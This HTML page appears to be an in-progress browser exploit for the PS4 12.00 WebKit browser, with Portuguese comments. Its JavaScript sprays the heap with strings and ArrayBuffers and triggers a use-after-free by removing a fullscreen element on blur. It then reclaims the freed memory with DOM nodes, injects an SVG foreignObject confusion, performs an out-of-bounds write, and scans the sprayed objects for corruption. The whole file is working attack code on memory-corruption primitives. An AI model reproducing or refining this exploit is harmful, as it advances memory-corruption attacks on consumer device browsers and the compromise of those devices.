<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - FastMalloc Strike</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF → FastMalloc Strike → JSC String/Buffer Scan</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 SAFE LOG
let logBuffer = [];
function log(msg){
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
// 🌍 FAST-MALLOC SPRAY (AS NOVAS ISCAS)
// Strings e Buffers costumam ser alocados no mesmo "bairro" que o DOM
function setupFastMallocSpray(){
    log("[*] Iniciando FastMalloc Spray (Strings e Buffers)...");

    window.str_spray = [];
    window.ab_spray = [];

    for(let i=0; i<6000; i++){
        // 1. Isca de String JS (Vai para o FastMalloc)
        // Usamos "B" para contrastar com nosso tiro de "X"
        window.str_spray.push("BAIT_STR_" + i + "_" + "B".repeat(0x200));

        // 2. Isca de ArrayBuffer (Dados brutos também costumam ir pro FastMalloc)
        let ab = new ArrayBuffer(0x200);
        let v = new Uint32Array(ab);
        v[0] = 0x13371337; // Assinatura
        v[1] = i;          // ID
        window.ab_spray.push(v);
    }

    log("[*] Spray FastMalloc concluído!");
}

// ==========================
// HEAP SETUP ORIGINAL (100% INALTERADO - Mantém a pressão do bug)
function setupHeap(){
    let arr=[];
    for(let i=0;i<5000;i++){
        let a=new Float64Array(8);
        a[0]=i;
        arr.push(a);
    }
    return arr;
}

// ==========================
// FULLSCREEN (100% INALTERADO)
function setupFullscreen(){
    let fsTarget=document.createElement("div");
    fsTarget.innerHTML="<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
    Object.assign(fsTarget.style,{
        background:"black", width:"100%", height:"100%", position:"absolute", top:"0", left:"0"
    });
    document.body.appendChild(fsTarget);
    fsTarget.webkitRequestFullscreen?.();
    return fsTarget;
}

// ==========================
// 💣 RECLAIM (100% INALTERADO)
function reclaim(size){
    log("[*] Reclaim size = " + size);
    for(let i=0;i<3000;i++){
        let e=document.createElement("div");
        document.body.appendChild(e);
        e.remove();
    }
    for(let i=0;i<size;i++){
        let e=document.createElement("div");
        e.innerHTML="<h1>CONTROL_"+i+"</h1>";
        document.body.appendChild(e);
    }
}

// ==========================
// 💥 SVG CONFUSION (100% INALTERADO)
function inject(child){
    try{
        child.outerHTML = `
        <svg>
            <foreignObject width="100%" height="100%">
                <div xmlns="http://www.w3.org/1999/xhtml">AAAA</div>
            </foreignObject>
        </svg>`;
        log("[*] payload injected");
    }catch(e){
        log("[UAF] inject crash");
    }
}

// ==========================
// 🔬 PROBE DO FASTMALLOC
function domOverlapProbe(fsTarget){
    log("---- FASTMALLOC PROBE ----");

    try{
        let n = fsTarget.firstChild;
        if(!n) return;

        if(n.nodeType === 3){
            log("[!!!] TEXTNODE CONFUSION");

            // 💣 DISPARA O TIRO LONGO: Trocamos para "X" para identificar fácil
            try{
                n.data = "X".repeat(0x1000); 
                log("[PWN] OOB write disparado (4KB de 'X')");
            }catch(e){
                log("[UAF] write crash");
            }

            // ==========================
            // 🔥 SCANNER DOS INFILTRADOS
            try{
                // 1. Checa se o tiro rasgou alguma String do JS
                for(let i=0; i<window.str_spray.length; i++){
                    // Se a string que era cheia de "B" de repente tiver "X", ACERTAMOS!
                    if(window.str_spray[i].includes("XXXX")){
                        log("[$$$] FASTMALLOC HIT! JS String corrompida @ " + i);
                        return;
                    }
                }

                // 2. Checa se o tiro pegou algum ArrayBuffer
                for(let i=0; i<window.ab_spray.length; i++){
                    if(window.ab_spray[i][0] !== 0x13371337){
                        log("[$$$] FASTMALLOC HIT! ArrayBuffer corrompido @ " + i);
                        return;
                    }
                }

                log("[SCAN] Nada atingido (Tiro passou no vazio)");

            }catch(e){
                log("[UAF] scan crash");
            }
        }
    }catch(e){
        log("[UAF] probe crash");
    }
}

// ==========================
// TRIGGER (100% INALTERADO)
function trigger(fsTarget){
    log("[*] Trigger");
    try{
        fsTarget.remove();
        if(document.webkitIsFullScreen || document.fullscreenElement) document.webkitExitFullscreen?.();
    }catch(e){}

    let sizes=[1500,2000,2500,3000];
    sizes.forEach((s,i)=>{
        setTimeout(()=>reclaim(s), i*50);
    });

    setTimeout(()=>{
        try{
            let child = fsTarget.firstChild;
            if(child) inject(child);
        }catch(e){}
    }, 30);

    setTimeout(()=>domOverlapProbe(fsTarget), 80);
    setTimeout(()=>domOverlapProbe(fsTarget), 180);
    setTimeout(()=>domOverlapProbe(fsTarget), 280);

    setTimeout(()=>{ alert(logBuffer.join("\n")); }, 450);
    setTimeout(()=>location.reload(), 600);
}

// ==========================
// MAIN
function runTest(){
    log("[*] Iniciando teste...");
    
    // Mantém sua pressão de memória intocável
    window.heap_press = setupHeap(); 

    // Planta os nossos espiões na arena do DOM
    setupFastMallocSpray(); 

    let fsTarget=setupFullscreen();
    window.onblur=function(){
        log("[*] onblur");
        setTimeout(()=>trigger(fsTarget), 3000);
    };
}

</script>

</body>
</html>
